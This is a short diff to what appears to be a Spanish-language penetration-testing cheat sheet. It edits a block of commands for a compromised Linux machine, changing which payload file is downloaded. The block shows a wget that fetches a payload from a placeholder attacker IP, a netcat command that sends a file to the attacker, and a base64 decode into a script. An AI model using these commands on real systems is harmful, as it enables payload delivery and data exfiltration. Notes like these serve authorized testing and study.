@@ -71,7 +71,7 @@ C:\Windows\Temp
 ```bash 
 # Victima Linux
 
-1. ❯ wget http://IP/payload.exe             # Para descargar el payload de la maquina Linux
+1. ❯ wget http://IP/payload.sh              # Para descargar el payload de la maquina Linux
 2. ❯ nc IP 443 < File.zip                   # Para pasar un archivo a la maquina de atacante 
 3. ❯ echo abcdef | base64 -d > script.sh    # Pegamos el contenido anterior en 'base64', lo decodeamos y guardamos 
 ```
